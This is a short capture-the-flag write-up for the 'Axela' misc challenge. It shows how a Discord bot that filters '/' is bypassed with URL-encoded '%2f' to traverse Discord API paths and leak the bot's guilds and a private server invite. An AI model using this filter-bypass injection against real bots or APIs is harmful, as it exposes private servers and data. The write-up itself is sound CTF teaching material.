# Axela

#### Category: misc
#### Points: 236

Axela was an easy misc discord bot challenge but not a lot of teams solved it. 

The challenge was to exploit a discord bot called Axela.

```
$ Axela help

All commands:

Axela ping - ping
Axela say <phrase> - repeats the phrase
Axela get guilds <guild_id> - gets info about a specific guild
Axela get channels <channel_id> - gets info about a specific channel
Axela get users <user_id> gets info about a specific user
```

An interesting discovery:

```
$ Axela get users !@

Unrecognized response format
{"user_id": ["Value \"!@\" is not snowflake."]}
```

This means Axela will leak values if the format is not what it expects. Also searching for snowflake leads us to the discord api.

```
$ Axela get users /

I dont like that character. Please don't use that.
```

Oh. They're filtering `/`. Now we know the exploit. URLEncode it.

```
$ Axela get users %2f

404: Not Found
```

As expected.

Using discord api documentation, let's get the servers Axela is a part of:

```
$ Axela get users @me%2fguilds

[{"id": "601776233411510302", "name": "Super Secret Server", "icon": "baca37e4b8e17d0d59afde06f86b4659", "owner": false, "permissions": 2146959351, "features": []}, {"id": "603684713361571879", "name": "watevrCTF", "icon": "2e898a64583de4c1c4bba2c58b69a303", "owner": false, "permissions": 104324673, "features": []}]
```

Looks like Axela is a part of the super secert server. Let's find a way to join that server. Maybe there are open invites to the server. Let's see.

```
$ Axela get guilds 601776233411510302%2finvites

[{"code": "GkadtPv", "guild": {"id": "601776233411510302", "name": "Super Secret Server", "splash": null, "banner": null, "description": null, "icon": "baca37e4b8e17d0d59afde06f86b4659", "features": [], "verification_level": 0, "vanity_url_code": null}, "channel": {"id": "601776741966413834", "name": "general", "type": 0}, "inviter": {"id": "601773149742432270", "username": "watevr", "avatar": null, "discriminator": "2443"}, "uses": 13, "max_uses": 0, "max_age": 0, "temporary": false, "created_at": "2019-07-19T14:07:36.029000+00:00"}]
```

Use the code to join the super secert server and you have the flag in the channel.

Don't try, the invite is invalidated now. It's a 1337 only server now. XD
